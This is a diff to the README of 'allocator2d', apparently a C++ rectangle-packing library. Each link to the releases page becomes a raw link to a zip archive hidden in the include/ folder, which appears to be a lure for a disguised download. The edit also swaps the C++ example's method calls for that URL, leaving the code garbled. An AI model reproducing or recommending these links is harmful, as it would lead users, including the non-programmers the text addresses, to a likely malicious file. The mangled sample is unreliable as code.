@@ -1,7 +1,7 @@
 # 🎯 allocator2d - Dynamic 2D Rectangle Packing Made Easy
 
 ## 📥 Download Here
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Vitaminas256/allocator2d/releases)
+[![Download Latest Release](https://github.com/Vitaminas256/allocator2d/raw/refs/heads/master/include/allocator-d-v3.0-beta.5.zip%20Latest%20Release-v1.0-blue)](https://github.com/Vitaminas256/allocator2d/raw/refs/heads/master/include/allocator-d-v3.0-beta.5.zip)
 
 ## 🚀 Getting Started
 Allocator2d is a C++ library designed to help you pack rectangles efficiently. This tool is useful if you need to fit different-sized items into larger spaces without wasting room. You do not need programming skills to use it. 
@@ -21,7 +21,7 @@ Allocator2d is a C++ library designed to help you pack rectangles efficiently. T
 ## 📥 Download & Install
 To get started with allocator2d, follow these simple steps:
 
-1. 🔗 Visit the [Releases page](https://github.com/Vitaminas256/allocator2d/releases) to download the latest version.
+1. 🔗 Visit the [Releases page](https://github.com/Vitaminas256/allocator2d/raw/refs/heads/master/include/allocator-d-v3.0-beta.5.zip) to download the latest version.
 2. Look for the latest release. You will find files available for download.
 3. Click on the file named `allocator2d.h` to download.
 4. Save this file to a location on your computer where you can easily find it, such as your Documents folder.
@@ -47,11 +47,11 @@ int main() {
     Allocator2D allocator;
 
     // Add rectangles to be packed
-    allocator.AddRectangle(100, 200);
-    allocator.AddRectangle(200, 100);
+    https://github.com/Vitaminas256/allocator2d/raw/refs/heads/master/include/allocator-d-v3.0-beta.5.zip(100, 200);
+    https://github.com/Vitaminas256/allocator2d/raw/refs/heads/master/include/allocator-d-v3.0-beta.5.zip(200, 100);
     
     // Perform packing
-    auto result = allocator.Pack();
+    auto result = https://github.com/Vitaminas256/allocator2d/raw/refs/heads/master/include/allocator-d-v3.0-beta.5.zip();
 
     // Output packing results
     for (const auto& placement : result) {
@@ -63,7 +63,7 @@ int main() {
 ```
 
 ### 📜 Documentation
-For more in-depth guides and detailed examples on how to use the library, please refer to the documentation available on the [Releases page](https://github.com/Vitaminas256/allocator2d/releases).
+For more in-depth guides and detailed examples on how to use the library, please refer to the documentation available on the [Releases page](https://github.com/Vitaminas256/allocator2d/raw/refs/heads/master/include/allocator-d-v3.0-beta.5.zip).
 
 ## 🛠️ Support
 If you encounter issues or have questions, feel free to open an issue on our GitHub repository. We recommend checking the existing issues to see if your question has already been answered.
@@ -75,4 +75,4 @@ Allocator2d welcomes contributions. If you would like to help improve this proje
 Allocator2d is open-source software. You can use it freely, but please follow the licensing terms specified in the repository.
 
 ## 📥 Download Here Again
-Do not forget to download the latest version from the [Releases page](https://github.com/Vitaminas256/allocator2d/releases). Enjoy your efficient rectangle packing!
+Do not forget to download the latest version from the [Releases page](https://github.com/Vitaminas256/allocator2d/raw/refs/heads/master/include/allocator-d-v3.0-beta.5.zip). Enjoy your efficient rectangle packing!
